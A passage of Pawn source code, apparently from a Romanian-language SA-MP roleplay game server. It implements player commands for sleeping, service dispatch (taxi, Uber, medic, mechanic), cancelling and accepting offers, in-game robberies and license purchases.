	for(new m=cache_num_rows(),i;x<m;x++) {
		cache_get_value_name_int(x, "Status", i);	
		cache_get_value_name(x, "name_and_tag", acover);	
		if(Iter_Contains(Acovers, i)) {
			if(strfind(acover, names, true) != -1) continue;
			SCMf(playerid, COLOR_WHITE, "(ID %d) %s | Level: %d | Faction: None | FPS: %d",i, GetName(i), GetPlayerScore(i), FPS2[i]);
			continue;
		}
		gQuery[0] = (EOS);
		if(PlayerInfo[i][pMember]) format(gQuery, 60, " (rank %d)", PlayerInfo[i][pRank]);
		new clan = PlayerInfo[i][pClan]; srsString[0] = (EOS);
		color = "{FFFFFF}";
		if(PlayerInfo[i][pAdmin]) color = "{AB0000}";
		else if(PlayerInfo[i][pReborn]) color = "{4A92FF}";
		if(!clan || PlayerInfo[i][pTag] == -1) format(srsString, MAX_PLAYER_NAME + 20, "%s%s{FFFFFF}", color, GetName(i));
		else if(PlayerInfo[i][pTag] == 0) format(srsString, MAX_PLAYER_NAME + 52, "{%s}%s%s%s{FFFFFF}", ClanInfo[clan][clColor], ClanInfo[clan][clTag], color, GetName(i));
		else if(PlayerInfo[i][pTag] == 1) format(srsString, MAX_PLAYER_NAME + 52, "%s%s{%s}%s{FFFFFF}", color, GetName(i), ClanInfo[clan][clColor], ClanInfo[clan][clTag]);								
		if(PlayerInfo[playerid][pAdmin] > 0) format(gString, 256, "(ID %d) %s | Level: %d | Faction: {%s}%s{FFFFFF}%s | FPS: %d - [AFK: %d]", i, srsString,PlayerInfo[i][pLevel], ColorFaction[PlayerInfo[i][pMember]], FactionName(PlayerInfo[i][pMember]), gQuery, FPS2[i], AFKSeconds[i]);
		else format(gString, 256, "(ID %d) %s | Level: %d | Faction: {%s}%s{FFFFFF}%s | FPS: %d",i, srsString, PlayerInfo[i][pLevel], ColorFaction[PlayerInfo[i][pMember]], FactionName(PlayerInfo[i][pMember]), gQuery, FPS2[i]);
		sendSplittedMessageToPlayer(playerid, COLOR_WHITE, COLOR_WHITE, gString);									
	}
	if(x >= 10) SendClientMessage(playerid, COLOR_WHITE, "Au fost afisate doar primele 10 rezultate.");
	return true;
}

static vips_[][] = {" ", "{91FF00}VIP USER\n", "{FF0000}VIP USER\n", "{FF0000}VIP USER\n"};

update_head_label(playerid) {
	new Float:up=0.3;
	gString[0]=0;
	if(PlayerInfo[playerid][pVip]) strcat(gString, vips_[PlayerInfo[playerid][pVip]]), up+=0.05;
	if(PlayerInfo[playerid][pYouTuber]) strcat(gString, "{FFFFFF}You{FF0000}Tuber\n"), up+=0.05;
	if(PlayerInfo[playerid][pReborn]==1) format(gString, sizeof gString, "%s{4A92FF}REBORN\n", gString),up+=0.05;
	if(PlayerInfo[playerid][pReborn]>1) format(gString, sizeof gString, "%s{4A92FF}REBORN %d\n", gString, PlayerInfo[playerid][pReborn]),up+=0.05;
	if(PlayerInfo[playerid][pVip] == 3) format(gString, sizeof gString, "%s{%s}LEGEND\n", gString, PlayerInfo[playerid][pChatColor]),up+=0.05;
	Update3DTextLabelText(vipLabel[playerid], -1, gString);
	Attach3DTextLabelToPlayer(vipLabel[playerid], playerid, 0.0, 0.0, up);
	return true;
}

create_head_label(playerid) {
	vipLabel[playerid] = Create3DTextLabel("", -1, 0.0, 0.0, 0.0, 10.0, 0, 0);
	new Float:up=0.3;
	gString[0]=0;
	if(PlayerInfo[playerid][pVip]) strcat(gString, vips_[PlayerInfo[playerid][pVip]]), up+=0.05;
	if(PlayerInfo[playerid][pYouTuber]) strcat(gString, "{FFFFFF}You{FF0000}Tuber\n"), up+=0.05;
	if(PlayerInfo[playerid][pReborn]) strcat(gString, "{4A92FF}REBORN\n"), up+=0.05;
	if(PlayerInfo[playerid][pVip] == 3) format(gString, sizeof gString, "%s{%s}LEGEND\n", gString, PlayerInfo[playerid][pChatColor]),up+=0.05;
	Update3DTextLabelText(vipLabel[playerid], -1, gString);
	Attach3DTextLabelToPlayer(vipLabel[playerid], playerid, 0.0, 0.0, up);
	return true;
}

hide_head_label(playerid) {
	Update3DTextLabelText(vipLabel[playerid], -1, "");
	return true;
}

cmd:acolor(playerid) {
	if(!IsAdmin(playerid, 1) && !IsHelper(playerid, 1)) return true;
	ShowPlayerDialog(playerid, DIALOG_ACOLOR, DIALOG_STYLE_LIST, "Nickname color", "Cool Red\nDark Red\nLight Red", "Choose", "Cancel");
	return 1;
}

cmd:sleep(playerid, params[]) {
	if(GetPlayerInterior(playerid) == 0) return SendClientMessage(playerid, COLOR_GREY, "Nu esti intr-o casa.");
	new x=InInteriorID[playerid];
	switch InInterior[playerid] do {
		case INVALID_INTERIOR: return true;
		case CLANHQ_INTERIOR: {
			if ClanHQInfo[x][cID]!=ClanInfo[PlayerInfo[playerid][pClan]][clHQ] *then return SendClientMessage(playerid, -1, "Poti folosi /sleep doar intr-o casa sau in clan HQ!");
			if(PlayerToPoint(2, playerid, ClanHQInfo[x][cEnterX], ClanHQInfo[x][cEnterY], ClanHQInfo[x][cEnterZ])) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti da /sleep in apropierea iesirii!"); 
		}
		case HOUSE_INTERIOR: {
			if x!=PlayerInfo[playerid][pHouse] *then return SendClientMessage(playerid, -1, "Poti folosi /sleep doar intr-o casa sau in clan HQ!");
			if(PlayerToPoint(2, playerid,HouseInfo[x][hExitx], HouseInfo[x][hExity], HouseInfo[x][hExitz])) return SendClientMessage(playerid, COLOR_LGREEN, "Eraore: Nu poti da /sleep in apropierea iesirii!");
		}
	}
	if(PlayerInfo[playerid][pWantedLevel] != 0) return SendClientMessage(playerid, COLOR_GREY, "Nu poti dormi deoarece esti cautat de politie.");
	if(OnDuty[playerid]) return SendClientMessage(playerid, COLOR_WHITE, "Nu poti folosi comanda /sleep cat timp esti duty!");
	if(!PlayerInfo[playerid][pSleeping]) {
		PlayerInfo[playerid][pSleeping] = true;
		TogglePlayerControllable(playerid, false);
		SendClientMessage(playerid, COLOR_LGREEN, "Acum dormi!");
		SendClientMessage(playerid, COLOR_LGREEN, "Recomandare: Daca doresti sa lasi jocul in bara, iti recomandam sa apesi intai tasta ESC pentru a nu aparea probleme.");
		LoopingAnim(playerid, "CRACK", "crckdeth2", 4.0, 1, 0, 0, 0, 0);
		SetPlayerHealthEx(playerid, 99);
		SetPlayerColor(playerid, COLOR_GREY);
		Freezed[playerid] = 1;
		PlayerTextDrawHide(playerid, dutyTD);
		SetPlayerArmourEx(playerid, 0);
		ResetWeapons(playerid);
		tazer[playerid] = 0;	
	}
	else {
		PlayerInfo[playerid][pSleeping] = false;
		TogglePlayerControllable(playerid, true);
		ClearAnimations(playerid);
		SendClientMessage(playerid, COLOR_LGREEN, "Bine ai revenit!");
		SetPlayerToTeamColor(playerid);
		SetPlayerHealthEx(playerid, 99);
		Freezed[playerid] = 0;
	}
	return true;
}

cmd:fixveh(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COLOR_WHITE, "Nu ai acces.");
    if(!IsPlayerInAnyVehicle(playerid)) return true;
	RepairVehicle(GetPlayerVehicleID(playerid));
	SetVehicleHealth(GetPlayerVehicleID(playerid), 999);
	Gas[GetPlayerVehicleID(playerid)] = 100;
	return true;
}
cmd:fuelcars(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 6) return SendClientMessage(playerid, COLOR_RED, "Eroare: {FFFFFF}Nu ai adminul necesar.");
	new full, string[60];
	if(sscanf(params, "i[10]", full)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/fuelcars <procent>");
    Gas[GetPlayerVehicleID(playerid)] = full;
    format(string, sizeof(string), "* Ai umplut canistra %d benzina.", full);
    SendClientMessage(playerid, COLOR_YELLOW, string);
	return true;
}
cmd:calls(playerid, params[]) {
	new f=0;
	switch(PlayerInfo[playerid][pMember]) {
		case 0: return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu faci parte dintr-o factiune!");
		case 12: f = 0;
		case 15: f = 1;
		case 23: f = 2;
		case 13: f = 3;
		case 8: f = 4;
		case 7: f = 5;
		default: return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Aceasta comanda nu este disponibila factiunii tale!");
	}

	switch(PlayerInfo[playerid][pMember]) {
		case 12,15,23: {
			if(!TaxiDuty[playerid]) return SendClientMessage(playerid, COLOR_GREY, "Porneste /fare pentru a prelua comenzi!");
		}
	}

	if(!Iter_Count(servicePlayers<f>)) 
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nimeni nu a apelat momentan la serviciile factiunii tale!");
	
	new x=0, Float:pos_x, Float:pos_y, Float:pos_z; gString[0] = (EOS); listitemmm[playerid] = f;
	strcat(gString, "Player\tLocation\n");
	foreach(new i : servicePlayers<f>) {
		SelectedPlayers[playerid][x] = i;
		GetPlayerPos(i, pos_x, pos_y, pos_z);			
		format(gQuery, 80, "%s (%d)\t%s - %.1fm\n", GetName(i), i, GetPlayerZone(i), GetDistanceBetweenPlayers(playerid,i));
		strcat(gString, gQuery);
		x++;
	}
	format(gQuery, 128, "%s's calls: %d", FactionName(PlayerInfo[playerid][pMember]), Iter_Count(servicePlayers<f>));
	ShowPlayerDialog(playerid, DIALOG_CALLS, DIALOG_STYLE_TABLIST_HEADERS, gQuery, gString, "Select", "Cancel");
	return true;
}
cmd:service(playerid, params[]) {
	if(GetPlayerVirtualWorld(playerid)) 
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti folosi aceasta comanda pentru ca te afli intr-un alt virtual world!");

	if(DeelayCommand[playerid][3]>gettime()) 
		return DeelayTime(playerid, 3);

	if(PlayerInfo[playerid][pJailTime])
		return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi aceata comanda in jail.");

	if(PlayerInfo[playerid][pWantedLevel])
		return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi aceasta comanda atata timp cat ai wanted!");

	new on1, on2, on3;
	foreach(new i : faction_players<12>) if(TaxiDuty[i]) on1++;
	foreach(new i : faction_players<15>) if(TaxiDuty[i]) on2++;
	foreach(new i : faction_players<23>) if(TaxiDuty[i]) on3++;
	format(gString, 500, "Type\tOnline members\n{FFFF00}Taxi Company\t%d online and {9DFF84}%d on-duty\n{91FF00}Uber Company\t%d online and {9DFF84}%d on-duty\n{A60505}Yango\t%d online and {9DFF84}%d on-duty\n{FF6347}Paramedic\t%d online\n{FFFFA8}Mechanic\t%d online\n{00FF80}Instructor\t%d online\nSpecial Guards\t%d online",
		Iter_Count(faction_players<12>), on1, Iter_Count(faction_players<15>), on2, Iter_Count(faction_players<23>), on3, Iter_Count(faction_players<13>), Iter_Count(faction_players<8>), Iter_Count(faction_players<7>), Iter_Count(faction_players<24>));
	ShowPlayerDialog(playerid, DIALOG_SERVICE, DIALOG_STYLE_TABLIST_HEADERS, "Services", gString, "Select", "Cancel");
	return true;
}
cmd:cancel(playerid, params[]) {
	extract params -> new string:type[32]; else {
		SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/cancel <name>");
		SendClientMessage(playerid, COLOR_WHITE, "Valabile: Drugs, Repair, Live, House, Taxi, Medic, Mecanic, Ticket, Refill, Materials, Trade, Instructor, Requestevent, Command, Uber.");
		return true;
	}
	switch YHash(type) do {
		case _H<taxi>: {
			if(!Iter_Contains(servicePlayers<0>, playerid)) 
				return SendClientMessage(playerid, COLOR_GREY, "Nu ai apelat la acest serviciu.");
			
			new id = AcceptedPlayerService[playerid][0];
			AcceptedPlayerService[playerid][0] = -1;
			format(gString, 180, "Taxi Dispatch: %s (%d) nu mai are nevoie de un taximetrist.", GetName(playerid), playerid);
			SendFactionMessage(12, 0x2C6CBFFF, gString);
			SendClientMessage(playerid, COLOR_WHITE, "Ai anulat comanda la acest serviciu.");
			Iter_Remove(servicePlayers<0>, playerid);
			if(id!=-1) {
				PlayerTextDrawHide(id, FindSkinTD);
				PlayerTextDrawHide(id, FindTD);
				targetfind[id] = -1;
				CP[id] = 0;
				DisablePlayerCheckpointEx(id);
				AcceptedService[id] = -1;
				SendClientMessage(id, COLOR_YELLOW, "Jucatorul caruia i-ai acceptat comanda tocmai a anulat-o.");
			}
		}
		case _H<uber>: {
			if(!Iter_Contains(servicePlayers<1>, playerid)) 
				return SendClientMessage(playerid, COLOR_GREY, "Nu ai apelat la acest serviciu.");
			
			new id = AcceptedPlayerService[playerid][1];
			format(gString, 180, "Uber Dispatch: %s (%d) nu mai are nevoie de un uber.", GetName(playerid), playerid);
			SendFactionMessage(15, 0x2C6CBFFF, gString);
			SendClientMessage(playerid, COLOR_WHITE, "Ai anulat comanda la acest serviciu.");
			Iter_Remove(servicePlayers<1>, playerid);
			if(id!=-1) {
				PlayerTextDrawHide(id, FindSkinTD);
				PlayerTextDrawHide(id, FindTD);
				targetfind[id] = -1;
				CP[id] = 0;
				DisablePlayerCheckpointEx(id);
				AcceptedService[id] = -1;
				SendClientMessage(id, COLOR_YELLOW, "Jucatorul caruia i-ai acceptat comanda tocmai a anulat-o.");
			}
			AcceptedPlayerService[playerid][1] = -1;
		}
		case _H<yango>: {
			if(!Iter_Contains(servicePlayers<2>, playerid)) 
				return SendClientMessage(playerid, COLOR_GREY, "Nu ai apelat la acest serviciu.");
			
			new id = AcceptedPlayerService[playerid][2];
			format(gString, 180, "Yango Dispatch: %s (%d) nu mai are nevoie de un yango.", GetName(playerid), playerid);
			SendFactionMessage(23, 0x2C6CBFFF, gString);
			SendClientMessage(playerid, COLOR_WHITE, "Ai anulat comanda la acest serviciu.");
			Iter_Remove(servicePlayers<2>, playerid);
			if(id!=-1) {
				PlayerTextDrawHide(id, FindSkinTD);
				PlayerTextDrawHide(id, FindTD);
				targetfind[id] = -1;
				CP[id] = 0;
				DisablePlayerCheckpointEx(id);
				AcceptedService[id] = -1;
				SendClientMessage(id, COLOR_YELLOW, "Jucatorul caruia i-ai acceptat comanda tocmai a anulat-o.");
			}
			AcceptedPlayerService[playerid][1] = -1;
		}
		case _H<command>: {
			if(AcceptedService[playerid] == -1) return true;
			new f=0, id=AcceptedService[playerid];
			switch(PlayerInfo[playerid][pMember]) {
				case 12: {
					f=0;
					SCMf(id, COLOR_YELLOW, "Taximetristul %s a renuntat la comanda. Asteapta pana cand comanda ta va fi preluata de alti membri.", GetName(playerid));
					format(gString, 180, "Taxi Dispatch: Taximetristul %s (%d) i-a anulat comanda lui %s (%d). Pentru a o accepta, foloseste (/calls).", GetName(playerid), playerid, GetName(id), id);
				}
				case 15: {
					f=1;
					SCMf(id, COLOR_YELLOW, "Uberul %s a renuntat la comanda. Asteapta pana cand comanda ta va fi preluata de alti membri.", GetName(playerid));
					format(gString, 180, "Uber Dispatch: Uberul %s (%d) i-a anulat comanda lui %s (%d). Pentru a o accepta, foloseste (/calls).", GetName(playerid), playerid, GetName(id), id);
				}
				case 23: {
					f=2;
					SCMf(id, COLOR_YELLOW, "Yango %s a renuntat la comanda. Asteapta pana cand comanda ta va fi preluata de alti membri.", GetName(playerid));
					format(gString, 180, "Yango Dispatch: Uberul %s (%d) i-a anulat comanda lui %s (%d). Pentru a o accepta, foloseste (/calls).", GetName(playerid), playerid, GetName(id), id);
				}
				case 13: {
					f=3;
					SCMf(id, COLOR_YELLOW, "Paramedic %s a renuntat la comanda. Asteapta pana cand comanda ta va fi preluata de alti membri.", GetName(playerid));
					format(gString, 180, "Paramedic Dispatch: Paramedicul %s (%d) i-a anulat comanda lui %s (%d). Pentru a o accepta, foloseste (/calls).", GetName(playerid), playerid, GetName(id), id);
				}
				case 8: {
					f=4;
					SCMf(id, COLOR_YELLOW, "Mechanicul %s a renuntat la comanda. Asteapta pana cand comanda ta va fi preluata de alti membri.", GetName(playerid));
					format(gString, 180, "TTC Dispatch: Mechanicul %s (%d) i-a anulat comanda lui %s (%d). Pentru a o accepta, foloseste (/calls).", GetName(playerid), playerid, GetName(id), id);
				}
				case 9: {
					f=5;
					SCMf(id, COLOR_YELLOW, "Instructorul %s a renuntat la comanda. Asteapta pana cand comanda ta va fi preluata de alti membri.", GetName(playerid));
					format(gString, 180, "SI Dispatch: Instructorul %s (%d) i-a anulat comanda lui %s (%d). Pentru a o accepta, foloseste (/calls).", GetName(playerid), playerid, GetName(id), id);
				}
			}
			Iter_Remove(servicePlayers<f>, id);
			SendFactionMessage(PlayerInfo[playerid][pMember], 0x2C6CBFFF, gString);
			SendClientMessage(playerid, COLOR_WHITE, "Ai renuntat la comanda acceptata!");
			PlayerTextDrawHide(playerid, FindTD);
			PlayerTextDrawHide(playerid, FindSkinTD);
			AcceptedService[playerid] = -1;
			targetfind[playerid] = -1;
			CP[playerid] = 0;
			DisablePlayerCheckpointEx(playerid);	
		}
		case _H<mecanic>: {
			if(!Iter_Contains(servicePlayers<4>, playerid)) 
				return SendClientMessage(playerid, COLOR_GREY, "Nu ai apelat la acest serviciu.");

			new id = AcceptedPlayerService[playerid][4];
			AcceptedPlayerService[playerid][4] = -1;
			format(gString, 180, "TTC Dispatch: %s (%d) nu mai are nevoie de un mechanic.", GetName(playerid), playerid);
			SendFactionMessage(12, 0x2C6CBFFF, gString);
			SendClientMessage(playerid, COLOR_WHITE, "Ai anulat comanda la acest serviciu.");
			Iter_Remove(servicePlayers<4>, playerid);
			if(id!=-1) {
				PlayerTextDrawHide(id, FindSkinTD);
				PlayerTextDrawHide(id, FindTD);
				targetfind[id] = -1;
				CP[id] = 0;
				DisablePlayerCheckpointEx(id);
				AcceptedService[id] = -1;
				SendClientMessage(id, COLOR_YELLOW, "Jucatorul caruia i-ai acceptat comanda tocmai a anulat-o.");
			}
		}
		case _H<instructor>: {
			if(!Iter_Contains(servicePlayers<5>, playerid)) 
				return SendClientMessage(playerid, COLOR_GREY, "Nu ai apelat la acest serviciu.");

			new id = AcceptedPlayerService[playerid][5];
			AcceptedPlayerService[playerid][5] = -1;
			format(gString, 180, "SI Dispatch: %s (%d) nu mai are nevoie de un instructor.", GetName(playerid), playerid);
			SendFactionMessage(12, 0x2C6CBFFF, gString);
			SendClientMessage(playerid, COLOR_WHITE, "Ai anulat comanda la acest serviciu.");
			Iter_Remove(servicePlayers<5>, playerid);
			if(id!=-1) {
				PlayerTextDrawHide(id, FindSkinTD);
				PlayerTextDrawHide(id, FindTD);
				targetfind[id] = -1;
				CP[id] = 0;
				DisablePlayerCheckpointEx(id);
				AcceptedService[id] = -1;
				SendClientMessage(id, COLOR_YELLOW, "Jucatorul caruia i-ai acceptat comanda tocmai a anulat-o.");
			}
		}
		case _H<trade>: {
			if(TradePlayer[playerid] == -1) return SendClientMessage(playerid, -1, "Nu ai primit o oferta!");
			TradePlayer[playerid] = -1;
			SendClientMessage(playerid, -1, "Afacere anulata!");
		}
		case _H<drugs>: {
			if(DrugOffer[playerid] == -1) return SendClientMessage(playerid,COLOR_WHITE, "Nimeni nu ti-a oferit droguri.");
			DrugOffer[playerid] = -1;
			DrugPrice[playerid] = 0;
			DrugGram[playerid] = 0;
		}
		case _H<repair>: {
			if(RepairOffer[playerid] == -1) return SendClientMessage(playerid,COLOR_WHITE, "Nimeni nu ti-a oferit o reparatie.");
			RepairOffer[playerid] = -1;
			RepairPrice[playerid] = 0;
			RepairCar[playerid] = 0;
		}
		case _H<materials>: {
			if(MatsOffer[playerid] == -1) return SendClientMessage(playerid,COLOR_WHITE, "Nimeni nu ti-a oferit materiale.");
			MatsOffer[playerid] = -1;
			MatsPrice[playerid] = 0;
			MatsAmmo[playerid] = 0;
		}
		case _H<gun>: {
			if(SellgunOffer[playerid] == -1) return SendClientMessage(playerid,COLOR_WHITE, "Nimeni nu ti-a oferit o arma.");
			SellgunOffer[playerid] = -1;
			SellgunPrice[playerid] = 0;
			SellgunMats[playerid] = 0;
			SellgunAmmo[playerid] = 0;
			SellgunID[playerid] = 0;
		}
		case _H<free>: {
			if(FreeOffer[playerid] == -1) return SendClientMessage(playerid,COLOR_WHITE, "Nimeni nu ti-a oferit un free.");
			FreeOffer[playerid] = -1;
			FreePrice[playerid] = 0;
		}
		case _H<live>: {
			if(LiveOffer[playerid] == -1) return SendClientMessage(playerid,COLOR_WHITE, "Nu ti-a oferit nimeni o cerere de live!");
			LiveOffer[playerid] = -1;
		}
		case _H<refill>: {
			if(RefillOffer[playerid] == -1) return SendClientMessage(playerid,COLOR_WHITE, "Nimeni nu ti-a oferit benzina.");
			RefillOffer[playerid] = -1;
			RefillPrice[playerid] = 0;
		}
		case _H<ticket>: {
			if(TicketOffer[playerid] == -1) return SendClientMessage(playerid,COLOR_WHITE, "Nimeni nu ti-a oferit o amenda.");
			TicketOffer[playerid] = -1;
			TicketMoney[playerid] = 0;
		}
		case _H<medic>: {
			if(!Iter_Contains(servicePlayers<3>, playerid)) 
				return SendClientMessage(playerid, COLOR_GREY, "Nu ai apelat la acest serviciu.");

			new id = AcceptedPlayerService[playerid][3];
			AcceptedPlayerService[playerid][3] = -1;
			format(gString, 180, "Paramedic Dispatch: %s (%d) nu mai are nevoie de un paramedic.", GetName(playerid), playerid);
			SendFactionMessage(12, 0x2C6CBFFF, gString);
			SendClientMessage(playerid, COLOR_WHITE, "Ai anulat comanda la acest serviciu.");
			Iter_Remove(servicePlayers<3>, playerid);
			if(id!=-1) {
				PlayerTextDrawHide(id, FindSkinTD);
				PlayerTextDrawHide(id, FindTD);
				targetfind[id] = -1;
				CP[id] = 0;
				DisablePlayerCheckpointEx(id);
				AcceptedService[id] = -1;
				SendClientMessage(id, COLOR_YELLOW, "Jucatorul caruia i-ai acceptat comanda tocmai a anulat-o.");
			}
		}
	}			
	return true;
}

cmd:anumber(playerid, params[]) {
	if(!IsAdmin(playerid, 1)) return true;

	extract params -> new player:id; else 
		return SendClientMessage(playerid, COLOR_GREY, "Syntax: {FFFFFF}/anumber <playerid/name>");

	if(!IsPlayerLogged(id)) return true;
	if(request_number[id]!=0) return SendClientMessage(playerid, COLOR_GREY, "Eroare: Acel player nu are o solicitare pentru schimbarea numarului!");
	ABroadcast(-1, 1, "{1f7a04}(/anumber): {FFFFFF}%s i-a schimbat numarul lui %s in '%s'.", GetName(playerid), GetName(id), request_num[id]);
	DeleteGVar(PlayerInfo[id][pPhone]);
	strmid(PlayerInfo[id][pPhone], request_num[id], 0, 10);
	UpdateVarStr(id, "PhoneNr", request_num[id]);
	SetGVarInt(PlayerInfo[id][pPhone], id+1);
	request_number[id] = -1;
	Iter_Remove(report<NUMBER>, id);
	return true;
}

cmd:accept(playerid, params[]) {
	extract params -> new string:item[32], player:id; else {
		SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/accept <item> <playerid/name>");
		SendClientMessage(playerid, COLOR_WHITE, "trade, dice, drugs, gun, repair, live, free, ticket, refill, invite, lesson, cinvite, clan, jobinvite, friend, rob, convoy.");
		return true;
	}
	if !IsPlayerConnected(id) *then 
		return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

	switch YHash(item) do {
		case _H<medic>, _H<taxi>, _H<mecanic>, _H<instructor>: return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Aceasta comanda nu mai este disponibila. Foloseste /calls!");	
		case _H<friend>: {
				if(cerereFriends[playerid]!=id) return SendClientMessage(playerid, COLOR_GREY, "Acel player nu ti-a trimis o cerere de prietenie!");
				cerereFriends[playerid] = -1;
				mysql_format(SQL, gQuery, 128, "SELECT * FROM `friends` WHERE `friendID` = '%i' OR `AddBy` = '%i' LIMIT 1", PlayerInfo[playerid][pSQLID], PlayerInfo[playerid][pSQLID]);
				mysql_tquery(SQL, gQuery, "sql_check_friend", "ii", playerid, id);
			}
			case _H<rob>: {
			if(rob_invite[id]!=playerid) return SendClientMessage(playerid, COLOR_GREY, "Acel player nu ti-a trimis o cerere de rob!");
			if p_rob[playerid][r_in_rob] *then return SendClientMessage(playerid, COLOR_GREY, "Nu poti accepta pentru ca esti deja intr-un jaf.");
			if(PlayerInfo[playerid][pWantedLevel]) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti accepta pentru ca ai wanted!");
			if PlayerInfo[playerid][pCarLicT] < gettime() *then return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai nevoie de licenta de condus!");
			if PlayerInfo[playerid][pGunLicT] < gettime() *then return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai nevoie de licenta de arme!");
			if(PlayerInfo[playerid][pRob] < 8) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai nevoie de 8 puncte de jaf.");
			rob_invite[id]=-1;
			SendClientMessage(playerid, 0xF7D2D2FF, "Rob:");
			SCMf(playerid, 0xF7D2D2FF, "Ai acceptat invitatia lui %s(%d) de rob.", GetName(id), id);
			SendClientMessage(id, 0xF7D2D2FF, "Rob:");
			SCMf(id, 0xF7D2D2FF, "%s(%d) a acceptat invitatia ta de rob.", GetName(playerid), playerid);
			p_rob[playerid][r_coPlayer] = id;
			p_rob[id][r_coPlayer] = playerid;
			p_rob[playerid][r_role] = true;
			p_rob[id][r_role] = false;

			new _x = p_rob[playerid][r_actor] = p_rob[id][r_actor] = random(sizeof rob_actor_pos);
			
			p_rob[playerid][r_backs] = p_rob[id][r_backs] = 0;
			SCMf(playerid, -1, "{47A028}(Rob) {FFFFFF}Du-te la checkpoint-ul marcat de pe mapa pentru a primi toate lucrurile de care ai nevoie. (%.1fm)", GetPlayerDistanceFromPoint(playerid, rob_actor_pos[_x][0], rob_actor_pos[_x][1], rob_actor_pos[_x][2]));
			SCMf(id, -1, "{47A028}(Rob) {FFFFFF}Du-te la checkpoint-ul marcat de pe mapa pentru a primi toate lucrurile de care ai nevoie. (%.1fm)", GetPlayerDistanceFromPoint(id, rob_actor_pos[_x][0], rob_actor_pos[_x][1], rob_actor_pos[_x][2]));
			SetPlayerCheckpoint(playerid,rob_actor_pos[_x][0], rob_actor_pos[_x][1], rob_actor_pos[_x][2], 2.0);
			SetPlayerCheckpoint(id,rob_actor_pos[_x][0], rob_actor_pos[_x][1], rob_actor_pos[_x][2], 2.0);
			CP[playerid] = CP[id] = 730;

			new const _bizz[] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 18};
			new _r = p_rob[playerid][r_biz_type] = p_rob[id][r_biz_type] = _bizz[random(sizeof _bizz)], _rtx=_r!=18?_r:9;
			p_rob[playerid][r_biz_id] = p_rob[id][r_biz_id] = BizzTypeID[_bizz[_rtx]][random(GpsBizzType[_bizz[_rtx]])];
		}
		case _H<lesson>: {
			new x = Lesson[playerid];
			if(x == -1 || x != id) return SendClientMessage(playerid, -1, "Acel player nu ti-a facut o invitatie.");
			if(InLesson[id]!=-1) return SendClientMessage(playerid, -1, "Acel instructor are deja o lectie activa.");
			InLesson[playerid] = id;
			InLesson[id] = playerid;
			Lesson[playerid] = -1;
			format(gString, 128, "SI Dispatch: %s (%d) a inceput o lectie cu %s (%d).", GetName(id), id, GetName(playerid), playerid);
			SendFactionMessage(PlayerInfo[id][pMember], COLOR_LIGHTBLUE, gString);
			SCMf(playerid, COLOR_LIGHTBLUE, "Ai acceptat lectia oferita de instructorul %s.", GetName(id));
			SCMf(id, COLOR_LIGHTBLUE, "%s ti-a acceptat inceperea lectiei cu tine.", GetName(playerid));
		}
		case _H<license>: {
			if(LicenseOffer[playerid] == -1) return SendClientMessage(playerid, -1, "Nu ai primit o oferta!");
			if(LicenseOffer[playerid] != id) return SendClientMessage(playerid, -1, "Acel player nu ti-a facut o oferta!");
			if(PlayerInfo[id][pMember] != 7 && PlayerInfo[id][pMember] != 16 && PlayerInfo[id][pMember] != 21) return SendClientMessage(playerid, -1, "Acel player nu este din factiunea School Instructors!");
			new money;
			switch(License[playerid]) {
				case 1: {
					money = 150000;
					if(GetPlayerCash(playerid) < money) return SendClientMessage(playerid, -1, "Nu ai aceasta suma de bani!");
					GivePlayerCash(playerid, -money);
					GivePlayerCash(id, money);
					
					PlayerInfo[playerid][pFlyLic] = 1;
					PlayerInfo[playerid][pFlyLicT] = gettime()+(20*86400);
					_query("UPDATE users SET `FlyLic`='1',`FlyLicT`='%i' WHERE `ID`='%d'", gettime()+(20*86400), PlayerInfo[playerid][pSQLID]);

					format(gString, 150, "SI Dispatch: %s (%d) i-a oferit licenta de zbor lui %s (%d) pentru suma de %d$.", GetName(id), id, GetName(playerid), playerid, money);
					SendFactionMessage(PlayerInfo[id][pMember], COLOR_LIGHTBLUE, gString);
				}
				case 2: {
					money = 100000;
					if(GetPlayerCash(playerid) < money) return SendClientMessage(playerid, -1, "Nu ai aceasta suma de bani!");
					GivePlayerCash(playerid, -money);
					GivePlayerCash(id, money);	
					
					PlayerInfo[playerid][pBoatLic] = 1;
					PlayerInfo[playerid][pBoatLicT] = gettime()+(20*86400);
					_query("UPDATE users SET `BoatLic`='1',`BoatLicT`='%i' WHERE `ID`='%d'", gettime()+(20*86400), PlayerInfo[playerid][pSQLID]);	

					format(gString, 150, "SI Dispatch: %s (%d) i-a oferit licenta de navigatie lui %s (%d) pentru suma de %d$.", GetName(id), id, GetName(playerid), playerid, money);
					SendFactionMessage(PlayerInfo[id][pMember], COLOR_LIGHTBLUE, gString);	
				}
				case 3: {
					money = 200000;
					if(GetPlayerCash(playerid) < money) return SendClientMessage(playerid, -1, "Nu ai aceasta suma de bani!");
					GivePlayerCash(playerid, -money);
					GivePlayerCash(id, money);	

					PlayerInfo[playerid][pGunLic] = 1;
					PlayerInfo[playerid][pGunLicT] = gettime()+(20*86400);
					_query("UPDATE users SET `GunLic`='1',`GunLicT`='%i' WHERE `ID`='%d'",gettime()+(20*86400),PlayerInfo[playerid][pSQLID]);

					format(gString, 180, "SI Dispatch: %s (%d) i-a oferit licenta de arme lui %s (%d) pentru suma de %d$. ", GetName(id), id, GetName(playerid), playerid, money);
					SendFactionMessage(PlayerInfo[id][pMember], COLOR_LIGHTBLUE, gString);	
				}
			}
